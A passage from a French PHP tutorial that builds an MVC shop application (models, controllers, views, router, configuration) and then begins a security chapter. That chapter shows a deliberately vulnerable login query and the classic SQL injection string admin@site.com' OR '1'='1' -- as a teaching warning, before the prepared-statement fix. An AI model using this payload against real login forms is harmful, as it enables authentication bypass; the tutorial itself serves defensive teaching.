        $stmt-&gt;execute();
        return $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function findById($id) {
        $sql = "SELECT * FROM {$this-&gt;table} WHERE id = :id";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute([':id' =&gt; $id]);
        return $stmt-&gt;fetch(PDO::FETCH_ASSOC);
    }
    
    public function create(array $data) {
        $columns = implode(',', array_keys($data));
        $placeholders = ':' . implode(', :', array_keys($data));
        
        $sql = "INSERT INTO {$this-&gt;table} ($columns) VALUES ($placeholders)";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute($data);
        
        return $this-&gt;db-&gt;lastInsertId();
    }
    
    public function update($id, array $data) {
        $setParts = [];
        foreach (array_keys($data) as $key) {
            $setParts[] = "$key = :$key";
        }
        $setClause = implode(', ', $setParts);
        
        $sql = "UPDATE {$this-&gt;table} SET $setClause WHERE id = :id";
        $data[':id'] = $id;
        
        $stmt = $this-&gt;db-&gt;prepare($sql);
        return $stmt-&gt;execute($data);
    }
    
    public function delete($id) {
        $sql = "DELETE FROM {$this-&gt;table} WHERE id = :id";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        return $stmt-&gt;execute([':id' =&gt; $id]);
    }
}

// models/Product.php
class Product extends Model {
    protected $table = 'products';
    
    // Méthodes spécifiques aux produits
    public function findByCategory($categoryId) {
        $sql = "SELECT * FROM {$this-&gt;table} WHERE category_id = :category_id ORDER BY name";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute([':category_id' =&gt; $categoryId]);
        return $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function search($term) {
        $sql = "SELECT * FROM {$this-&gt;table} 
                WHERE name LIKE :term OR description LIKE :term 
                ORDER BY name";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute([':term' =&gt; "%$term%"]);
        return $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function updateStock($id, $quantity) {
        $sql = "UPDATE {$this-&gt;table} SET stock = stock - :quantity 
                WHERE id = :id AND stock &gt;= :quantity";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        return $stmt-&gt;execute([
            ':id' =&gt; $id,
            ':quantity' =&gt; $quantity
        ]);
    }
    
    public function getStatistics() {
        $sql = "SELECT 
                    COUNT(*) as total_products,
                    AVG(price) as average_price,
                    SUM(stock) as total_stock
                FROM {$this-&gt;table}";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute();
        return $stmt-&gt;fetch(PDO::FETCH_ASSOC);
    }
}

// models/User.php
class User extends Model {
    protected $table = 'users';
    
    public function findByEmail($email) {
        $sql = "SELECT * FROM {$this-&gt;table} WHERE email = :email";
        $stmt = $this-&gt;db-&gt;prepare($sql);
        $stmt-&gt;execute([':email' =&gt; $email]);
        return $stmt-&gt;fetch(PDO::FETCH_ASSOC);
    }
    
    public function createUser($name, $email, $password) {
        $data = [
            'name' =&gt; $name,
            'email' =&gt; $email,
            'password' =&gt; password_hash($password, PASSWORD_DEFAULT),
            'created_at' =&gt; date('Y-m-d H:i:s')
        ];
        
        return $this-&gt;create($data);
    }
    
    public function authenticate($email, $password) {
        $user = $this-&gt;findByEmail($email);
        
        if ($user && password_verify($password, $user['password'])) {
            return $user;
        }
        
        return false;
    }
}
?&gt;</code></pre>

    <h3>19.4 Le Contrôleur - Chef d'orchestre</h3>
    
    <h4>Classe de base pour les contrôleurs :</h4>
    <pre><code>&lt;?php
// core/Controller.php
abstract class Controller {
    
    // Charger une vue avec des données
    protected function view($viewName, $data = []) {
        // Extraire les données pour les rendre disponibles dans la vue
        extract($data);
        
        // Charger le header
        include_once 'views/layouts/header.php';
        
        // Charger la vue demandée
        $viewFile = "views/$viewName.php";
        if (file_exists($viewFile)) {
            include_once $viewFile;
        } else {
            throw new Exception("Vue $viewName non trouvée");
        }
        
        // Charger le footer
        include_once 'views/layouts/footer.php';
    }
    
    // Redirection
    protected function redirect($url) {
        header("Location: $url");
        exit;
    }
    
    // Réponse JSON pour les API
    protected function json($data, $status = 200) {
        http_response_code($status);
        header('Content-Type: application/json');
        echo json_encode($data);
        exit;
    }
    
    // Valider les données POST/GET
    protected function validate($data, $rules) {
        $errors = [];
        
        foreach ($rules as $field =&gt; $rule) {
            if ($rule['required'] && empty($data[$field])) {
                $errors[$field] = "Le champ $field est obligatoire";
                continue;
            }
            
            if (!empty($data[$field])) {
                // Validation email
                if (isset($rule['email']) && !filter_var($data[$field], FILTER_VALIDATE_EMAIL)) {
                    $errors[$field] = "Format email invalide";
                }
                
                // Validation longueur minimale
                if (isset($rule['min']) && strlen($data[$field]) &lt; $rule['min']) {
                    $errors[$field] = "Le champ $field doit faire au moins {$rule['min']} caractères";
                }
                
                // Validation longueur maximale
                if (isset($rule['max']) && strlen($data[$field]) &gt; $rule['max']) {
                    $errors[$field] = "Le champ $field ne peut pas dépasser {$rule['max']} caractères";
                }
            }
        }
        
        return $errors;
    }
}

// controllers/ProductController.php
class ProductController extends Controller {
    private $productModel;
    
    public function __construct() {
        $this-&gt;productModel = new Product();
    }
    
    // GET /products - Liste des produits
    public function index() {
        $search = $_GET['search'] ?? '';
        
        if ($search) {
            $products = $this-&gt;productModel-&gt;search($search);
            $title = "Résultats pour '$search'";
        } else {
            $products = $this-&gt;productModel-&gt;findAll();
            $title = "Tous nos produits";
        }
        
        $this-&gt;view('products/index', [
            'products' =&gt; $products,
            'title' =&gt; $title,
            'search' =&gt; $search
        ]);
    }
    
    // GET /products/show/5 - Détail d'un produit
    public function show() {
        $id = $_GET['id'] ?? 0;
        $product = $this-&gt;productModel-&gt;findById($id);
        
        if (!$product) {
            $this-&gt;redirect('/products?error=Produit non trouvé');
        }
        
        $this-&gt;view('products/show', [
            'product' =&gt; $product,
            'title' =&gt; $product['name']
        ]);
    }
    
    // GET /products/create - Formulaire de création
    public function create() {
        $this-&gt;view('products/create', [
            'title' =&gt; 'Nouveau produit'
        ]);
    }
    
    // POST /products/store - Enregistrer un nouveau produit
    public function store() {
        $rules = [
            'name' =&gt; ['required' =&gt; true, 'min' =&gt; 2, 'max' =&gt; 255],
            'description' =&gt; ['required' =&gt; true, 'min' =&gt; 10],
            'price' =&gt; ['required' =&gt; true],
            'stock' =&gt; ['required' =&gt; true]
        ];
        
        $errors = $this-&gt;validate($_POST, $rules);
        
        if (empty($errors)) {
            // Validation spécifique
            if (!is_numeric($_POST['price']) || $_POST['price'] &lt;= 0) {
                $errors['price'] = 'Le prix doit être un nombre positif';
            }
            
            if (!is_numeric($_POST['stock']) || $_POST['stock'] &lt; 0) {
                $errors['stock'] = 'Le stock doit être un nombre positif ou zéro';
            }
        }
        
        if (!empty($errors)) {
            $this-&gt;view('products/create', [
                'title' =&gt; 'Nouveau produit',
                'errors' =&gt; $errors,
                'old' =&gt; $_POST
            ]);
            return;
        }
        
        // Créer le produit
        $productData = [
            'name' =&gt; htmlspecialchars($_POST['name']),
            'description' =&gt; htmlspecialchars($_POST['description']),
            'price' =&gt; floatval($_POST['price']),
            'stock' =&gt; intval($_POST['stock']),
            'created_at' =&gt; date('Y-m-d H:i:s')
        ];
        
        $productId = $this-&gt;productModel-&gt;create($productData);
        
        $this-&gt;redirect("/products/show?id=$productId&amp;success=Produit créé avec succès");
    }
    
    // GET /products/edit/5 - Formulaire d'édition
    public function edit() {
        $id = $_GET['id'] ?? 0;
        $product = $this-&gt;productModel-&gt;findById($id);
        
        if (!$product) {
            $this-&gt;redirect('/products?error=Produit non trouvé');
        }
        
        $this-&gt;view('products/edit', [
            'product' =&gt; $product,
            'title' =&gt; 'Modifier ' . $product['name']
        ]);
    }
    
    // POST /products/update/5 - Mettre à jour un produit
    public function update() {
        $id = $_POST['id'] ?? 0;
        $product = $this-&gt;productModel-&gt;findById($id);
        
        if (!$product) {
            $this-&gt;redirect('/products?error=Produit non trouvé');
        }
        
        // Même validation que pour create
        $rules = [
            'name' =&gt; ['required' =&gt; true, 'min' =&gt; 2, 'max' =&gt; 255],
            'description' =&gt; ['required' =&gt; true, 'min' =&gt; 10],
            'price' =&gt; ['required' =&gt; true],
            'stock' =&gt; ['required' =&gt; true]
        ];
        
        $errors = $this-&gt;validate($_POST, $rules);
        
        if (empty($errors)) {
            $updateData = [
                'name' =&gt; htmlspecialchars($_POST['name']),
                'description' =&gt; htmlspecialchars($_POST['description']),
                'price' =&gt; floatval($_POST['price']),
                'stock' =&gt; intval($_POST['stock']),
                'updated_at' =&gt; date('Y-m-d H:i:s')
            ];
            
            $this-&gt;productModel-&gt;update($id, $updateData);
            
            $this-&gt;redirect("/products/show?id=$id&amp;success=Produit modifié avec succès");
        } else {
            $this-&gt;view('products/edit', [
                'product' =&gt; $product,
                'title' =&gt; 'Modifier ' . $product['name'],
                'errors' =&gt; $errors,
                'old' =&gt; $_POST
            ]);
        }
    }
    
    // POST /products/delete/5 - Supprimer un produit
    public function delete() {
        $id = $_POST['id'] ?? 0;
        $product = $this-&gt;productModel-&gt;findById($id);
        
        if ($product) {
            $this-&gt;productModel-&gt;delete($id);
            $this-&gt;redirect('/products?success=Produit supprimé avec succès');
        } else {
            $this-&gt;redirect('/products?error=Produit non trouvé');
        }
    }
    
    // API endpoint - Retourner du JSON
    public function api() {
        $products = $this-&gt;productModel-&gt;findAll();
        $this-&gt;json($products);
    }
}

// controllers/HomeController.php
class HomeController extends Controller {
    
    public function index() {
        $productModel = new Product();
        $userModel = new User();
        
        // Données pour la page d'accueil
        $stats = $productModel-&gt;getStatistics();
        $latestProducts = array_slice($productModel-&gt;findAll(), 0, 6);
        
        $this-&gt;view('home/index', [
            'title' =&gt; 'Accueil',
            'stats' =&gt; $stats,
            'latestProducts' =&gt; $latestProducts
        ]);
    }
    
    public function about() {
        $this-&gt;view('home/about', [
            'title' =&gt; 'À propos'
        ]);
    }
    
    public function contact() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Traiter le formulaire de contact
            $rules = [
                'name' =&gt; ['required' =&gt; true, 'min' =&gt; 2],
                'email' =&gt; ['required' =&gt; true, 'email' =&gt; true],
                'message' =&gt; ['required' =&gt; true, 'min' =&gt; 10]
            ];
            
            $errors = $this-&gt;validate($_POST, $rules);
            
            if (empty($errors)) {
                // Ici on pourrait envoyer un email ou sauvegarder en BDD
                $this-&gt;view('home/contact', [
                    'title' =&gt; 'Contact',
                    'success' =&gt; 'Message envoyé avec succès !'
                ]);
                return;
            }
        }
        
        $this-&gt;view('home/contact', [
            'title' =&gt; 'Contact',
            'errors' =&gt; $errors ?? [],
            'old' =&gt; $_POST ?? []
        ]);
    }
}
?&gt;</code></pre>

    <h3>19.5 Les Vues - Interface utilisateur</h3>
    
    <h4>Template de base (layouts) :</h4>
    <pre><code>&lt;?php
// views/layouts/header.php
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html lang="fr"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;&lt;?= isset($title) ? $title . ' - ' : '' ?&gt;Mon Site MVC&lt;/title&gt;
    &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"&gt;
    &lt;link href="/public/css/style.css" rel="stylesheet"&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;nav class="navbar navbar-expand-lg navbar-dark bg-primary"&gt;
        &lt;div class="container"&gt;
            &lt;a class="navbar-brand" href="/"&gt;🏪 Mon Site MVC&lt;/a&gt;
            
            &lt;button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"&gt;
                &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;
            &lt;/button&gt;
            
            &lt;div class="collapse navbar-collapse" id="navbarNav"&gt;
                &lt;ul class="navbar-nav me-auto"&gt;
                    &lt;li class="nav-item"&gt;
                        &lt;a class="nav-link" href="/"&gt;🏠 Accueil&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class="nav-item"&gt;
                        &lt;a class="nav-link" href="/products"&gt;📦 Produits&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class="nav-item"&gt;
                        &lt;a class="nav-link" href="/contact"&gt;📧 Contact&lt;/a&gt;
                    &lt;/li&gt;
                &lt;/ul&gt;
                
                &lt;ul class="navbar-nav"&gt;
                    &lt;li class="nav-item"&gt;
                        &lt;a class="nav-link" href="/login"&gt;🔐 Connexion&lt;/a&gt;
                    &lt;/li&gt;
                &lt;/ul&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/nav&gt;
    
    &lt;main class="container mt-4"&gt;
        &lt;!-- Messages flash --&gt;
        &lt;?php if (isset($_GET['success'])): ?&gt;
            &lt;div class="alert alert-success alert-dismissible fade show"&gt;
                &lt;?= htmlspecialchars($_GET['success']) ?&gt;
                &lt;button type="button" class="btn-close" data-bs-dismiss="alert"&gt;&lt;/button&gt;
            &lt;/div&gt;
        &lt;?php endif; ?&gt;
        
        &lt;?php if (isset($_GET['error'])): ?&gt;
            &lt;div class="alert alert-danger alert-dismissible fade show"&gt;
                &lt;?= htmlspecialchars($_GET['error']) ?&gt;
                &lt;button type="button" class="btn-close" data-bs-dismiss="alert"&gt;&lt;/button&gt;
            &lt;/div&gt;
        &lt;?php endif; ?&gt;

&lt;?php
// views/layouts/footer.php
?&gt;
    &lt;/main&gt;
    
    &lt;footer class="bg-dark text-light mt-5 py-4"&gt;
        &lt;div class="container text-center"&gt;
            &lt;p&gt;&amp;copy; 2024 Mon Site MVC - Fait avec ❤️ et PHP&lt;/p&gt;
            &lt;p&gt;
                &lt;a href="/about" class="text-light"&gt;À propos&lt;/a&gt; | 
                &lt;a href="/contact" class="text-light"&gt;Contact&lt;/a&gt; | 
                &lt;a href="/products" class="text-light"&gt;Produits&lt;/a&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/footer&gt;
    
    &lt;script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"&gt;&lt;/script&gt;
    &lt;script src="/public/js/app.js"&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h4>Vues spécifiques :</h4>
    <pre><code>&lt;?php
// views/home/index.php
?&gt;
&lt;div class="hero-section bg-primary text-white text-center py-5 mb-5 rounded"&gt;
    &lt;h1 class="display-4"&gt;🚀 Bienvenue sur Mon Site MVC&lt;/h1&gt;
    &lt;p class="lead"&gt;Découvrez notre sélection de produits organisés avec l'architecture MVC&lt;/p&gt;
    &lt;a href="/products" class="btn btn-light btn-lg"&gt;📦 Voir nos produits&lt;/a&gt;
&lt;/div&gt;

&lt;div class="row mb-5"&gt;
    &lt;div class="col-md-4"&gt;
        &lt;div class="card bg-info text-white"&gt;
            &lt;div class="card-body text-center"&gt;
                &lt;h5&gt;📊 Total Produits&lt;/h5&gt;
                &lt;h2&gt;&lt;?= $stats['total_products'] ?&gt;&lt;/h2&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="col-md-4"&gt;
        &lt;div class="card bg-success text-white"&gt;
            &lt;div class="card-body text-center"&gt;
                &lt;h5&gt;📦 Stock Total&lt;/h5&gt;
                &lt;h2&gt;&lt;?= number_format($stats['total_stock']) ?&gt;&lt;/h2&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="col-md-4"&gt;
        &lt;div class="card bg-warning text-white"&gt;
            &lt;div class="card-body text-center"&gt;
                &lt;h5&gt;💰 Prix Moyen&lt;/h5&gt;
                &lt;h2&gt;&lt;?= number_format($stats['average_price'], 2) ?&gt;€&lt;/h2&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;h2&gt;🆕 Derniers Produits&lt;/h2&gt;
&lt;div class="row"&gt;
    &lt;?php foreach ($latestProducts as $product): ?&gt;
        &lt;div class="col-md-4 mb-4"&gt;
            &lt;div class="card h-100"&gt;
                &lt;div class="card-body"&gt;
                    &lt;h5 class="card-title"&gt;&lt;?= htmlspecialchars($product['name']) ?&gt;&lt;/h5&gt;
                    &lt;p class="card-text"&gt;&lt;?= htmlspecialchars(substr($product['description'], 0, 100)) ?&gt;...&lt;/p&gt;
                    &lt;p class="text-primary fw-bold"&gt;&lt;?= number_format($product['price'], 2) ?&gt;€&lt;/p&gt;
                &lt;/div&gt;
                &lt;div class="card-footer"&gt;
                    &lt;a href="/products/show?id=&lt;?= $product['id'] ?&gt;" class="btn btn-primary"&gt;Voir détails&lt;/a&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;?php endforeach; ?&gt;
&lt;/div&gt;

&lt;?php
// views/products/index.php
?&gt;
&lt;div class="d-flex justify-content-between align-items-center mb-4"&gt;
    &lt;h1&gt;&lt;?= htmlspecialchars($title) ?&gt;&lt;/h1&gt;
    &lt;a href="/products/create" class="btn btn-primary"&gt;➕ Nouveau produit&lt;/a&gt;
&lt;/div&gt;

&lt;!-- Barre de recherche --&gt;
&lt;div class="card mb-4"&gt;
    &lt;div class="card-body"&gt;
        &lt;form method="GET" action="/products" class="d-flex"&gt;
            &lt;input type="text" name="search" class="form-control me-2" 
                   placeholder="Rechercher un produit..." 
                   value="&lt;?= htmlspecialchars($search) ?&gt;"&gt;
            &lt;button type="submit" class="btn btn-outline-primary"&gt;🔍 Rechercher&lt;/button&gt;
            &lt;?php if ($search): ?&gt;
                &lt;a href="/products" class="btn btn-outline-secondary ms-2"&gt;❌ Reset&lt;/a&gt;
            &lt;?php endif; ?&gt;
        &lt;/form&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;!-- Liste des produits --&gt;
&lt;?php if (empty($products)): ?&gt;
    &lt;div class="alert alert-info text-center"&gt;
        &lt;h4&gt;Aucun produit trouvé&lt;/h4&gt;
        &lt;p&gt;Aucun produit ne correspond à votre recherche.&lt;/p&gt;
        &lt;a href="/products/create" class="btn btn-primary"&gt;Ajouter le premier produit&lt;/a&gt;
    &lt;/div&gt;
&lt;?php else: ?&gt;
    &lt;div class="row"&gt;
        &lt;?php foreach ($products as $product): ?&gt;
            &lt;div class="col-md-6 col-lg-4 mb-4"&gt;
                &lt;div class="card h-100"&gt;
                    &lt;div class="card-body"&gt;
                        &lt;h5 class="card-title"&gt;&lt;?= htmlspecialchars($product['name']) ?&gt;&lt;/h5&gt;
                        &lt;p class="card-text"&gt;&lt;?= htmlspecialchars(substr($product['description'], 0, 100)) ?&gt;...&lt;/p&gt;
                        &lt;div class="d-flex justify-content-between align-items-center"&gt;
                            &lt;span class="text-primary fw-bold fs-5"&gt;&lt;?= number_format($product['price'], 2) ?&gt;€&lt;/span&gt;
                            &lt;small class="text-muted"&gt;Stock: &lt;?= $product['stock'] ?&gt;&lt;/small&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                    &lt;div class="card-footer"&gt;
                        &lt;div class="btn-group w-100"&gt;
                            &lt;a href="/products/show?id=&lt;?= $product['id'] ?&gt;" class="btn btn-outline-primary"&gt;👁️ Voir&lt;/a&gt;
                            &lt;a href="/products/edit?id=&lt;?= $product['id'] ?&gt;" class="btn btn-outline-warning"&gt;✏️ Modifier&lt;/a&gt;
                            &lt;button onclick="deleteProduct(&lt;?= $product['id'] ?&gt;, '&lt;?= htmlspecialchars($product['name']) ?&gt;')" 
                                    class="btn btn-outline-danger"&gt;🗑️ Supprimer&lt;/button&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;?php endforeach; ?&gt;
    &lt;/div&gt;
&lt;?php endif; ?&gt;

&lt;script&gt;
function deleteProduct(id, name) {
    if (confirm(`Êtes-vous sûr de vouloir supprimer "${name}" ?`)) {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = '/products/delete';
        
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'id';
        input.value = id;
        
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
    }
}
&lt;/script&gt;</code></pre>

    <h3>19.6 Le Routeur - Aiguilleur</h3>
    
    <h4>Système de routage simple :</h4>
    <pre><code>&lt;?php
// core/Router.php
class Router {
    private $routes = [];
    
    public function addRoute($method, $uri, $controller, $action) {
        $this-&gt;routes[] = [
            'method' =&gt; strtoupper($method),
            'uri' =&gt; $uri,
            'controller' =&gt; $controller,
            'action' =&gt; $action
        ];
    }
    
    public function get($uri, $controller, $action) {
        $this-&gt;addRoute('GET', $uri, $controller, $action);
    }
    
    public function post($uri, $controller, $action) {
        $this-&gt;addRoute('POST', $uri, $controller, $action);
    }
    
    public function dispatch() {
        $requestMethod = $_SERVER['REQUEST_METHOD'];
        $requestUri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        
        // Supprimer le slash final s'il existe
        $requestUri = rtrim($requestUri, '/');
        if (empty($requestUri)) $requestUri = '/';
        
        foreach ($this-&gt;routes as $route) {
            if ($route['method'] === $requestMethod && $this-&gt;matchRoute($route['uri'], $requestUri)) {
                $controllerName = $route['controller'];
                $actionName = $route['action'];
                
                // Vérifier que le contrôleur existe
                if (!class_exists($controllerName)) {
                    throw new Exception("Contrôleur $controllerName non trouvé");
                }
                
                $controller = new $controllerName();
                
                // Vérifier que l'action existe
                if (!method_exists($controller, $actionName)) {
                    throw new Exception("Action $actionName non trouvée dans $controllerName");
                }
                
                // Exécuter l'action
                $controller-&gt;$actionName();
                return;
            }
        }
        
        // Aucune route trouvée
        $this-&gt;show404();
    }
    
    private function matchRoute($routeUri, $requestUri) {
        // Gestion des paramètres simples (ex: /products/show/5)
        $routeParts = explode('/', $routeUri);
        $requestParts = explode('/', $requestUri);
        
        if (count($routeParts) !== count($requestParts)) {
            return false;
        }
        
        for ($i = 0; $i &lt; count($routeParts); $i++) {
            $routePart = $routeParts[$i];
            $requestPart = $requestParts[$i];
            
            // Paramètre dynamique (ex: {id})
            if (preg_match('/^{(\w+)}$/', $routePart, $matches)) {
                $_GET[$matches[1]] = $requestPart;
                continue;
            }
            
            // Partie fixe
            if ($routePart !== $requestPart) {
                return false;
            }
        }
        
        return true;
    }
    
    private function show404() {
        http_response_code(404);
        include 'views/errors/404.php';
    }
}

// index.php - Point d'entrée principal
&lt;?php
// Configuration
require_once 'config/database.php';

// Autoloader
spl_autoload_register(function ($class) {
    $directories = ['core', 'controllers', 'models'];
    
    foreach ($directories as $dir) {
        $file = __DIR__ . "/$dir/$class.php";
        if (file_exists($file)) {
            require_once $file;
            return;
        }
    }
});

// Gestion des erreurs
set_exception_handler(function($exception) {
    error_log($exception-&gt;getMessage());
    http_response_code(500);
    include 'views/errors/500.php';
});

// Initialisation du routeur
$router = new Router();

// Définition des routes
// Page d'accueil
$router-&gt;get('/', 'HomeController', 'index');
$router-&gt;get('/about', 'HomeController', 'about');
$router-&gt;get('/contact', 'HomeController', 'contact');
$router-&gt;post('/contact', 'HomeController', 'contact');

// Routes produits
$router-&gt;get('/products', 'ProductController', 'index');
$router-&gt;get('/products/show', 'ProductController', 'show');
$router-&gt;get('/products/create', 'ProductController', 'create');
$router-&gt;post('/products/store', 'ProductController', 'store');
$router-&gt;get('/products/edit', 'ProductController', 'edit');
$router-&gt;post('/products/update', 'ProductController', 'update');
$router-&gt;post('/products/delete', 'ProductController', 'delete');

// API
$router-&gt;get('/api/products', 'ProductController', 'api');

// Routes utilisateurs
$router-&gt;get('/login', 'UserController', 'login');
$router-&gt;post('/login', 'UserController', 'authenticate');
$router-&gt;get('/logout', 'UserController', 'logout');
$router-&gt;get('/register', 'UserController', 'register');
$router-&gt;post('/register', 'UserController', 'store');

// Lancement de l'application
try {
    $router-&gt;dispatch();
} catch (Exception $e) {
    error_log($e-&gt;getMessage());
    http_response_code(500);
    echo "Une erreur est survenue. Veuillez réessayer plus tard.";
}
?&gt;</code></pre>

    <h3>19.7 Configuration et sécurité</h3>
    
    <h4>Configuration centralisée :</h4>
    <pre><code>&lt;?php
// config/database.php
class Database {
    private static $instance = null;
    private $connection;
    
    private function __construct() {
        $config = [
            'host' =&gt; $_ENV['DB_HOST'] ?? 'localhost',
            'dbname' =&gt; $_ENV['DB_NAME'] ?? 'mvc_app',
            'username' =&gt; $_ENV['DB_USER'] ?? 'root',
            'password' =&gt; $_ENV['DB_PASS'] ?? '',
            'charset' =&gt; 'utf8mb4'
        ];
        
        try {
            $dsn = "mysql:host={$config['host']};dbname={$config['dbname']};charset={$config['charset']}";
            $this-&gt;connection = new PDO($dsn, $config['username'], $config['password'], [
                PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
                PDO::ATTR_EMULATE_PREPARES =&gt; false
            ]);
        } catch (PDOException $e) {
            error_log("Erreur de connexion DB : " . $e-&gt;getMessage());
            die("Erreur de base de données");
        }
    }
    
    public static function getInstance() {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    public function getConnection() {
        return $this-&gt;connection;
    }
}

// config/app.php
return [
    'app_name' =&gt; 'Mon Site MVC',
    'app_url' =&gt; $_ENV['APP_URL'] ?? 'http://localhost',
    'debug' =&gt; $_ENV['APP_DEBUG'] ?? false,
    'timezone' =&gt; 'Europe/Paris',
    
    // Sécurité
    'session_lifetime' =&gt; 86400, // 24 heures
    'csrf_token_name' =&gt; '_token',
    'password_min_length' =&gt; 8,
    
    // Upload
    'upload_path' =&gt; 'public/uploads/',
    'upload_max_size' =&gt; 5 * 1024 * 1024, // 5MB
    'allowed_extensions' =&gt; ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx']
];
?&gt;</code></pre>

    <h3>19.8 Exercice pratique : Blog MVC complet</h3>
    
    <p><strong>Objectif :</strong> Créer un blog simple avec l'architecture MVC.</p>
    
    <p><strong>Fonctionnalités à implémenter :</strong></p>
    <ol>
        <li><strong>Articles :</strong> CRUD complet (titre, contenu, auteur, date)</li>
        <li><strong>Catégories :</strong> Classification des articles</li>
        <li><strong>Commentaires :</strong> Système de commentaires par article</li>
        <li><strong>Utilisateurs :</strong> Inscription, connexion, profils</li>
        <li><strong>Dashboard :</strong> Interface d'administration</li>
        <li><strong>API :</strong> Endpoints JSON pour les articles</li>
        <li><strong>Recherche :</strong> Système de recherche avancée</li>
    </ol>

    <details>
        <summary><strong>💡 Voir la structure de solution</strong></summary>
        <pre><code>Structure du blog MVC :

models/
├── Article.php
├── Category.php
├── Comment.php
├── User.php
└── Database.php

controllers/
├── ArticleController.php
├── CategoryController.php
├── CommentController.php
├── UserController.php
├── DashboardController.php
└── ApiController.php

views/
├── layouts/
│   ├── header.php
│   ├── footer.php
│   └── admin.php
├── articles/
│   ├── index.php
│   ├── show.php
│   ├── create.php
│   └── edit.php
├── dashboard/
│   ├── index.php
│   └── stats.php
└── users/
    ├── login.php
    ├── register.php
    └── profile.php

Tables SQL :
- articles (id, title, content, category_id, user_id, created_at, updated_at)
- categories (id, name, description)
- comments (id, article_id, user_id, content, created_at)
- users (id, name, email, password, role, created_at)

Routes principales :
GET    /                     -> ArticleController@index
GET    /articles/{id}        -> ArticleController@show
GET    /categories/{id}      -> CategoryController@show
POST   /comments             -> CommentController@store
GET    /dashboard            -> DashboardController@index
GET    /api/articles         -> ApiController@articles
</code></pre>
    </details>
</section>

<!-- Partie 20: Bonnes pratiques et sécurité -->
<section class="part20">
    <h2>20. Bonnes pratiques et sécurité (hash, injection SQL, XSS)</h2>
    
    <p>La sécurité en développement web, c'est comme <strong>fermer sa maison à clé</strong> ! Vous ne laisseriez jamais votre porte ouverte avec un panneau "Entrez, servez-vous !" ? Alors pourquoi le faire avec votre code ? Cette dernière partie synthétise <strong>toutes les bonnes pratiques</strong> pour créer des applications PHP robustes et sécurisées.</p>

    <p><strong>Règle d'or :</strong> Jamais faire confiance aux données externes (utilisateurs, APIs, fichiers...) !</p>

    <h3>20.1 Protection contre les injections SQL</h3>
    
    <p>L'<strong>injection SQL</strong> est l'attaque n°1 sur les applications web. C'est quand un pirate arrive à "parler directement" à votre base de données en trichant avec vos formulaires.</p>

    <h4>❌ Code vulnérable (JAMAIS faire ça !) :</h4>
    <pre><code>&lt;?php
// DANGER MORTEL ! 💀
$email = $_POST['email'];
$password = $_POST['password'];

// Un pirate peut mettre : admin@site.com' OR '1'='1' --
$sql = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
$result = $pdo-&gt;query($sql);

// La requête devient : 
// SELECT * FROM users WHERE email = 'admin@site.com' OR '1'='1' --' AND password = '...'
// Le -- met le reste en commentaire, et 1=1 est toujours vrai = connexion sans mot de passe !
?&gt;</code></pre>

    <h4>✅ Protection avec requêtes préparées :</h4>
    <pre><code>&lt;?php
// SÉCURISÉ ! ✨
class SecureAuth {
    private $pdo;
    
    public function __construct() {
        $this-&gt;pdo = Database::getInstance()-&gt;getConnection();
    }
    
    public function authenticate($email, $password) {
        // 1. Validation des entrées
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return ['success' =&gt; false, 'message' =&gt; 'Email invalide'];
        }
        
        if (strlen($password) &lt; 8) {
            return ['success' =&gt; false, 'message' =&gt; 'Mot de passe trop court'];
        }
        
        // 2. Requête préparée - IMPOSSIBLE à injecter
        $sql = "SELECT id, name, email, password_hash, failed_attempts, last_attempt 
                FROM users 
                WHERE email = :email AND active = 1";
        
        try {
            $stmt = $this-&gt;pdo-&gt;prepare($sql);
            $stmt-&gt;execute([':email' =&gt; $email]);
            $user = $stmt-&gt;fetch();
            
            if (!$user) {
                $this-&gt;logFailedAttempt($email);
